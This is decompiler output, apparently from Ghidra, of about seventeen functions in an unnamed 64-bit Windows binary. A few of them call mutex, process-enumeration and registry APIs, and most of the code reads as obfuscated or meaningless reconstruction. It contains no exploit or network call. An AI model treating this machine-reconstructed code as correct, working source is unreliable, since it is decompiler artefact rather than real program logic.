## Function: FUN_18004ef70 (0x18004ef70)

```c

undefined8 FUN_18004ef70(void)

{
  return 0x3484452f1e3cbc29;
}


```

---

## Function: FUN_18004f018 (0x18004f018)

```c

undefined8 FUN_18004f018(undefined8 param_1,longlong param_2)

{
  longlong in_R11;
  
  FUN_18000a090(in_R11,param_2 + 0x1b,-0x7ff3d887);
  return 0;
}


```

---

## Function: FUN_18004f090 (0x18004f090)

```c

undefined1 * FUN_18004f090(void)

{
  return &stack0xfffffffffffffff8;
}


```

---

## Function: FUN_18004f0f0 (0x18004f0f0)

```c

undefined8 FUN_18004f0f0(void)

{
  return 0x11ded3db800000;
}


```

---

## Function: FUN_18004f168 (0x18004f168)

```c

undefined1 * FUN_18004f168(void)

{
  undefined1 local_28 [24];
  
  FUN_180048618();
  return local_28;
}


```

---

## Function: FUN_18004f258 (0x18004f258)

```c

void FUN_18004f258(void)

{
  longlong unaff_RDI;
  ulonglong in_R10;
  LPCSTR lpName;
  ulonglong unaff_R12;
  
  lpName = (LPCSTR)(in_R10 & unaff_R12);
  if (unaff_RDI + -0x25f14a3024da14c8 < 0) {
    lpName = lpName + 0x10;
  }
  OpenMutexA(0x178141,(BOOL)&stack0xfffffffffffffff0,lpName);
  return;
}


```

---

## Function: FUN_18004f340 (0x18004f340)

```c

longlong FUN_18004f340(void)

{
  longlong lVar1;
  byte bVar2;
  undefined1 local_10 [8];
  
  bVar2 = 0;
  lVar1 = Process32NextW(0x79d469b53a0fbd1c,&DAT_1800c63de,&DAT_1800d4c50,local_10);
  return (lVar1 + -6) - (ulonglong)bVar2;
}


```

---

## Function: FUN_18004f3e8 (0x18004f3e8)

```c

void FUN_18004f3e8(void)

{
  return;
}


```

---

## Function: FUN_18004f458 (0x18004f458)

```c

void FUN_18004f458(void)

{
  return;
}


```

---

## Function: FUN_18004f4c0 (0x18004f4c0)

```c

/* WARNING: Removing unreachable block (ram,0x00018004f562) */
/* WARNING: Removing unreachable block (ram,0x00018004f5be) */

longlong FUN_18004f4c0(void)

{
  ulonglong uVar1;
  ulonglong uVar2;
  ulonglong unaff_RBX;
  longlong lVar3;
  longlong in_R10;
  longlong in_R11;
  longlong unaff_R12;
  undefined8 local_38;
  
  if ((in_R11 - in_R10 & unaff_RBX) == 0) {
    unaff_R12 = local_38;
  }
  lVar3 = 0xcc068b58;
  uVar1 = FUN_1800495c0();
  uVar2 = 0;
  if (uVar1 != 0) {
    uVar2 = uVar1 >> 7;
    lVar3 = 0xcc068b58 - unaff_R12;
  }
  return uVar2 + lVar3;
}


```

---

## Function: FUN_18004f5e8 (0x18004f5e8)

```c

void FUN_18004f5e8(void)

{
  FUN_18003aad0();
  FUN_1800394b0();
  FUN_180010f40();
  return;
}


```

---

## Function: FUN_18004f700 (0x18004f700)

```c

/* WARNING: Removing unreachable block (ram,0x00018004f7a6) */

void FUN_18004f700(void)

{
  char local_30 [24];
  
  _strnicmp(&DAT_1800c071a,local_30,(size_t)local_30);
  return;
}


```

---

## Function: FUN_18004f800 (0x18004f800)

```c

undefined8 FUN_18004f800(void)

{
  undefined8 local_28;
  
  return local_28;
}


```

---

## Function: FUN_18004f868 (0x18004f868)

```c

/* WARNING: Removing unreachable block (ram,0x00018004f93c) */
/* WARNING: Type propagation algorithm not settling */

void FUN_18004f868(void)

{
  LPDWORD in_stack_ffffffffffffff38;
  LPDWORD in_stack_ffffffffffffff40;
  LPBYTE in_stack_ffffffffffffff48;
  LPDWORD in_stack_ffffffffffffff50;
  
  RegEnumValueA((HKEY)&DAT_1800c6783,(DWORD)&stack0xffffffffffffff48,&DAT_1800c2f73,
                (LPDWORD)&stack0xffffffffffffff48,in_stack_ffffffffffffff38,
                in_stack_ffffffffffffff40,in_stack_ffffffffffffff48,in_stack_ffffffffffffff50);
  return;
}


```

---

## Function: FUN_18004fa50 (0x18004fa50)

```c

/* WARNING: Removing unreachable block (ram,0x00018004fa95) */

void FUN_18004fa50(void)

{
  FUN_180045e28();
  return;
}


```

---

## Function: FUN_18004fad8 (0x18004fad8)

```c

undefined1 * FUN_18004fad8(longlong param_1,undefined8 param_2,undefined8 param_3,LPCWSTR param_4)

{
  PHKEY unaff_RSI;
  
  RegOpenKeyW((HKEY)(param_1 + 3),param_4,unaff_RSI);
  return &stack0xfffffffffffffff8;
}


```

---

## Function: FUN_18004fb58 (0x18004fb58)

```c

/* WARNING: Removing unreachable block (ram,0x00018004fba0) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_18004fb58(void)

{
  FUN_1800276c0();
  return;
}


```

---

